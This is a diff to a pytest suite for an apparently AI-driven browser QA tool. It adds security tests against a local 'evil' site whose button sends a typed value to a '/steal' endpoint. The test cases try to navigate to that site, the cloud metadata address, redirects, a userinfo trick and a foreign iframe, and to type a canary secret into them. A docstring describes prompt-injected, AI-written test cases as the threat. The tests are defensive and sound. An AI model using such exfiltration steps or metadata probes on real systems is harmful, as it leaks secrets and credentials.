@@ -359,7 +359,7 @@ def test_map_marks_elements_hidden_until_a_menu_is_opened(ui_app):
     m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=["/delayed"]))
     delayed = next(p for p in m.pages if p["path"] == "/delayed")
     assert "save_button" in delayed["elements"] and delayed["hidden"] == []
-    assert "hidden until" not in m.as_context() or True       # context renders without error
+    assert isinstance(m.as_context(), str) and "/delayed" in m.as_context()   # context renders the page
 
 
 # ── Single-page apps (PocketBase dashboard, 2026-10-19) ───────────────────────
@@ -862,3 +862,83 @@ def test_card_buttons_are_tied_to_their_product_and_count_links_get_a_real_name(
         {"step_number": 3, "playwright_action": "assert", "selector_key": "#out", "assertion_type": "text", "assertion_value": "Added Bot Shirt"}]}
     r = _run([case])["results"][0]
     assert r["status"] == "PASS", [(s["step_number"], s["status"], s.get("actual_result"), s.get("error")) for s in r["steps"]]
+
+
+@pytest.fixture
+def evil_site():
+    """A second local 'site' that records every request it gets (the attacker in these tests)."""
+    from flask import Flask, request as freq
+    from werkzeug.serving import make_server
+    seen = []
+    evil = Flask("evil")
+
+    @evil.route("/", defaults={"p": ""}, methods=["GET", "POST"])
+    @evil.route("/<path:p>", methods=["GET", "POST"])
+    def anything(p):
+        seen.append(f"{freq.method} /{p} {freq.get_data(as_text=True)}")
+        return "<input id='x'><button id='go' onclick=\"fetch('/steal?v='+document.getElementById('x').value)\">go</button>"
+    srv = make_server("127.0.0.1", 0, evil, threaded=True)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    yield f"http://127.0.0.1:{srv.server_port}/", seen
+    srv.shutdown()
+
+
+def test_a_test_case_cannot_take_the_browser_or_a_secret_to_another_site(ui_app, evil_site, monkeypatch):
+    """P0 (security audit 2026-10-20): an AI-written (possibly prompt-injected) case could open
+    another site — or a cloud metadata address — and type a {{env:QAX_VAR_*}} secret into it."""
+    evil, seen = evil_site
+    monkeypatch.setenv("QAX_VAR_CANARY", "canary-s3cret")
+    steps = lambda *s: [dict(x, step_number=i) for i, x in enumerate(s, 1)]  # noqa: E731
+    cases = [
+        {"test_case_id": "NAV", "title": "navigate away", "automation_steps": steps(
+            {"playwright_action": "navigate", "value": evil})},
+        {"test_case_id": "META", "title": "metadata", "automation_steps": steps(
+            {"playwright_action": "navigate", "value": "http://169.254.169.254/latest/meta-data/"})},
+        {"test_case_id": "AT", "title": "userinfo trick", "automation_steps": steps(
+            {"playwright_action": "navigate", "value": "@" + evil.split("//")[1]})},
+        {"test_case_id": "CLICK", "title": "a link leaves the app", "automation_steps": steps(
+            {"playwright_action": "navigate", "value": f"/link-away?to={evil}"},
+            {"playwright_action": "click", "selector_key": "#out-link"},
+            {"playwright_action": "fill", "selector_key": "#x", "value": "{{env:QAX_VAR_CANARY}}"},
+            {"playwright_action": "click", "selector_key": "#go"})},
+        {"test_case_id": "REDIR", "title": "a redirect leaves the app", "automation_steps": steps(
+            {"playwright_action": "navigate", "value": f"/away?to={evil}"})},
+        {"test_case_id": "FRAME", "title": "a secret into a foreign frame", "automation_steps": steps(
+            {"playwright_action": "navigate", "value": f"/link-away?to={evil}"},
+            {"playwright_action": "fill", "selector_key": "iframe#foreign >>> #x", "value": "{{env:QAX_VAR_CANARY}}"})},
+    ]
+    res = {r["test_case_id"]: r for r in _run(cases)["results"]}
+    assert all(res[c]["status"] != "PASS" for c in ("NAV", "META", "REDIR")), [(k, v["status"], [(s.get("actual_result"), s.get("error")) for s in v["steps"]]) for k, v in res.items() if k in ("REDIR",)]
+    # "@evil:port/" is joined as a PATH of the app — it stays on the app's own origin
+    assert f"127.0.0.1:{ui_app}/" in res["AT"]["steps"][0]["actual_result"], res["AT"]["steps"][0]
+    assert "refused" in res["NAV"]["steps"][0]["error"] and "refused" in res["META"]["steps"][0]["error"]
+    assert "refused" in (res["FRAME"]["steps"][1].get("error") or "")
+    assert not [s for s in seen if "canary" in s], seen                     # the secret never left
+    assert not [s for s in seen if s.startswith("GET / ")], seen   # no top-level visit (an embedded frame may load)
+    kinds = {e["kind"] for r in res.values() for e in r.get("page_errors", [])}
+    assert "blocked navigation" in kinds
+
+
+def test_the_app_reader_never_reads_or_logs_in_to_another_site(ui_app, evil_site):
+    from core.app_mapper import map_app
+    evil, seen = evil_site
+    m = asyncio.run(map_app(f"http://127.0.0.1:{ui_app}", start_paths=[f"/away?to={evil}login"],
+                            username="demo", password="demo123"))
+    assert not any(p["path"].startswith("/login") and "evil" in p.get("title", "") for p in m.pages)
+    assert not [s for s in seen if s.startswith("POST")], seen               # no password posted there
+    assert any("off-origin" in s for s in m.skipped_links), m.skipped_links
+
+
+def test_a_trace_of_a_case_that_types_a_secret_is_not_kept(ui_app, monkeypatch):
+    monkeypatch.setenv("QAX_TRACE", "true")
+    monkeypatch.setenv("QAX_VAR_CANARY", "canary-s3cret")
+    case = {"test_case_id": "TR", "title": "types a secret", "automation_steps": [
+        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
+        {"step_number": 2, "playwright_action": "fill", "selector_key": "#password", "value": "{{env:QAX_VAR_CANARY}}"}]}
+    plain = {"test_case_id": "TP", "title": "no secret", "automation_steps": [
+        {"step_number": 1, "playwright_action": "navigate", "value": "/login"},
+        {"step_number": 2, "playwright_action": "fill", "selector_key": "#username", "value": "demo"}]}
+    r = {x["test_case_id"]: x for x in _run([case, plain])["results"]}
+    assert "trace" not in r["TR"] and "secret" in r["TR"]["trace_note"]
+    import os as _os
+    assert r["TP"].get("trace") and oct(_os.stat(r["TP"]["trace"]).st_mode & 0o777) == "0o600"
